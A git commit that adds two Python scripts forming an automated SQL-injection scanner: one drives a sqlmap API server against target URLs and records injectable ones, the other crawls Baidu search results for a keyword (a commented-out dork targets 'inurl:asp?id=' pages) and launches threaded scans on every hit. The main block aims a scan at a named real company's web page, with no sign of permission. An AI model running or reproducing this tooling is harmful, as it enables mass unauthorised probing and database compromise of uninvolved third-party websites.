1df13ccb5f6c474ace3e2808c715442c95e64a17
Akamei <1246165945@qq.com>
2017-07-23 15:58:34 +0800

    暂时完成了一些,还需要修改下

---
+++ AutoSqli.py
@@ -0,0 +1,187 @@
+#!/usr/bin/python
+#-*-coding:utf-8-*-
+from __future__ import absolute_import, print_function
+
+import requests
+import time
+import json
+import threading
+import Queue
+import logging
+# from config import LOG, API_URL
+
+
+class AutoSqli(object):
+    """
+    使用sqlmapapi的方法进行与sqlmapapi建立的server进行交互
+
+    """
+    def __init__(self, target='', server='http://127.0.0.1:8775',data = '',referer = '',cookie = ''):
+        super(AutoSqli, self).__init__()
+        self.server = server
+        if self.server[-1] != '/':
+            self.server = self.server + '/'
+        self.target = target
+        self.taskid = ''
+        self.engineid = ''
+        self.status = ''
+        self.data = data
+        self.referer = referer
+        self.cookie = cookie
+        self.start_time = time.time()
+        self.logger = logging.getLogger('app.run')
+        self.logger.info('Creating an instance of AutoSqli for {0}.'.format(self.target))
+
+    def task_new(self):
+        try:
+            self.taskid = json.loads(
+                requests.get(self.server + 'task/new').text)['taskid']
+            #print 'Created new task: ' + self.taskid
+            if len(self.taskid) > 0:
+                return True
+            return False
+        except ConnectionError:
+            self.logging.error("sqlmapapi.py is not running")
+
+    def task_delete(self):
+        json_kill = requests.get(self.server + 'task/' + self.taskid + '/delete').text
+        # if json.loads(requests.get(self.server + 'task/' + self.taskid + '/delete').text)['success']:
+        #     #print '[%s] Deleted task' % (self.taskid)
+        #     return True
+        # return False
+
+    def scan_start(self):
+        headers = {'Content-Type': 'application/json'}
+        self.logger.debug("Starting to scan "+ self.target +"..................")
+        payload = {'url': self.target}
+        url = self.server + 'scan/' + self.taskid + '/start'
+        t = json.loads(
+            requests.post(url, data=json.dumps(payload), headers=headers).text)
+        self.engineid = t['engineid']
+        if len(str(self.engineid)) > 0 and t['success']:
+            #print 'Started scan'
+            return True
+        return False
+
+    def scan_status(self):
+        self.status = json.loads(
+            requests.get(self.server + 'scan/' + self.taskid + '/status').text)['status']
+        if self.status == 'running':
+            return 'running'
+        elif self.status == 'terminated':
+            return 'terminated'
+        else:
+            return 'error'
+
+    def scan_data(self):
+        self.data = json.loads(
+            requests.get(self.server + 'scan/' + self.taskid + '/data').text)['data']
+        if len(self.data) == 0:
+            #print 'not injection\t'
+            pass
+        else:
+            with open("vuln.txt", "a+") as f:
+                f.write(self.target+"\n")
+            self.logger.warning('injection \t')
+            # f = open('data/injection.txt','a')
+            # f.write(self.target+'\n')
+            # f.close()
+            # self.logger.warning('injection \t')
+
+    def option_set(self):
+        headers = {'Content-Type': 'application/json'}
+        option = {"options": {
+                    "randomAgent": True,
+                    "tech":"BT"
+                    }
+                 }
+        url = self.server + 'option/' + self.taskid + '/set'
+        t = json.loads(
+            requests.post(url, data=json.dumps(option), headers=headers).text)
+        #print t
+
+    def scan_stop(self):
+        json_stop=requests.get(self.server + 'scan/' + self.taskid + '/stop').text
+        # json.loads(
+        #     requests.get(self.server + 'scan/' + self.taskid + '/stop').text)['success']
+
+    def scan_kill(self):
+        json_kill=requests.get(self.server + 'scan/' + self.taskid + '/kill').text
+        # json.loads(
+        #     requests.get(self.server + 'scan/' + self.taskid + '/kill').text)['success']
+
+    def run(self):
+        if not self.task_new():
+            return False
+        self.option_set()
+        if not self.scan_start():
+            return False
+        while True:
+            if self.scan_status() == 'running':
+                time.sleep(5)
+            elif self.scan_status() == 'terminated':
+                break
+            else:
+                break
+            #print time.time() - self.start_time
+            if time.time() - self.start_time > 200:
+                error = True
+                self.scan_stop()
+                self.scan_kill()
+                break
+        self.scan_data()
+        self.task_delete()
+        #print time.time() - self.start_time
+#
+# class myThread(threading.Thread):
+#     def __init__(self,q,thread_id):
+#         threading.Thread.__init__(self)
+#         self.q=q
+#         self.thread_id=thread_id
+#     def run(self):
+#         while not self.q.empty():
+#             #print "threading "+str(self.thread_id)+" is running"
+#             objects=self.q.get()
+#             result=objects.run()
+#
+# def main():
+#     import argparse
+#     parser = argparse.ArgumentParser()
+#     parser.add_argument('-n', '--num', default=4, nargs='?', type=int, dest='num', help="Thread num")
+#     parser.add_argument('-p', '--page', default=3, nargs='?', type=int, dest='page', help="Search Page num")
+#     parser.add_argument('-d', '--log', default=LOG["filename"], nargs='?', type=str, dest='log', help="The path of debug log")
+#     args = parser.parse_args()
+#     logger = logging.getLogger('app')
+#     logger.setLevel(LOG["level"])
+#     fh = logging.FileHandler(args.log)
+#     fh.setLevel(LOG["level"])
+#     formatter = logging.Formatter(LOG['format'], LOG["datefmt"])
+#     fh.setFormatter(formatter)
+#     sh = logging.StreamHandler()
+#     sh.setLevel(LOG["level"])
+#     sh.setFormatter(formatter)
+#     logger.addHandler(fh)
+#     logger.addHandler(sh)
+#     urls = []
+#     logger.info('the program starts!')
+#     pages = args.page
+#     key = 'inurl:asp?id='
+#     urls = baidu.geturl(key, pages)
+#     #print urls
+#     workQueue = Queue.Queue()
+#     for tar in urls:
+#         s = AutoSqli(API_URL, tar)
+#         workQueue.put(s)
+#     threads = []
+#     nloops = range(args.num)   #threads Num
+#     for i in nloops:
+#         t = myThread(workQueue, i)
+#         t.start()
+#         threads.append(t)
+#     for i in nloops:
+#             threads[i].join()
+#     logger.info("Exiting Main Thread")
+
+if __name__ == '__main__':
+    t = AutoSqli('http://www.changan-mazda.com.cn/market/runningmen/article.php?id=191')
+    t.run()
---
+++ crawl.py
@@ -0,0 +1,91 @@
+# _*_ coding:utf-8 _*_
+# MainUsage: 计划为边爬行边扫描的脚本
+import requests
+import gevent
+from gevent.queue import Queue
+from bs4 import BeautifulSoup
+from AutoSqli import AutoSqli
+import argparse
+import threading
+
+# CrawlUsage: use baidu to crawl the "?id=" etc url
+class Crawl():
+
+    def __init__(self, word):
+        self.word = word
+        self.threads = []
+        self.urls = Queue()
+        self.next_page = None
+
+    def baidu_crawl(self):
+        # first crawl
+        # set the next page url
+        # in the end
+        if self.next_page:
+            r = requests.get(self.next_page)
+            content = r.content
+            self.urls, self.next_page = self.parse_baidu_content(content)
+            return self.urls, self.next_page
+        elif self.word:
+            print self.word+"hah!!!!!!!!!!!!!!!!!!!!!!!!!!!1"
+            r = requests.session()
+            url = "http://www.baidu.com/s?wd="+self.word
+            content = r.get(url).content
+            # parse the content and get the urls
+            self.urls, self.next_page = self.parse_baidu_content(content)
+            self.word = None
+            return self.urls, self.next_page
+
+    def parse_baidu_content(self, content):
+        soup = BeautifulSoup(content, "lxml")
+        containers = soup.find_all(attrs={"class": "c-showurl"})
+        for container in containers:
+            url = container.get('href')
+            if url:
+                tmpPage = requests.get(url, allow_redirects=False)
+                if tmpPage.status_code == 302:
+                    self.urls.put(tmpPage.headers.get("location"))
+        next_page = soup.find("strong")
+        next_page = next_page.find_next_siblings(attrs={"class":"n"})
+        if next_page:
+            url = "http://www.baidu.com"+next_page[0].get("href")
+            self.next_page = url
+        else:
+            self.next_page = None
+        return self.urls, self.next_page
+
+def run(word):
+    c = Crawl(word)
+    c.urls, c.next_page = c.baidu_crawl()
+    while True:
+        while not c.urls.empty():
+            url = c.urls.get()
+            s = AutoSqli(url)
+            # t = gevent.spawn(s.run)
+            t = threading.Thread(target=s.run)
+            c.threads.append(t)
+            print url
+            t.start()
+        else:
+            # gevent.joinall(c.threads)
+            for t in c.threads:
+                t.join()
+            if c.next_page:
+                c.urls, c.next_page = c.baidu_crawl()
+            else:
+                break
+
+if __name__ == '__main__':
+    parse = argparse.ArgumentParser()
+    parse.add_argument("-w", "--word", help="the single word that you want to crawl")
+    parse.add_argument("-f", "--file", help="get the word from the file")
+    args = parse.parse_args()
+    # word = input("please enter the word that you want to crawl")
+    if args.word:
+        run(args.word)
+    if args.file:
+        f = open(args.file, "r")
+        lines = f.readlines()
+        for line in lines:
+            word = line
+    print "All Crawl and Done!!!!!!!!!1"
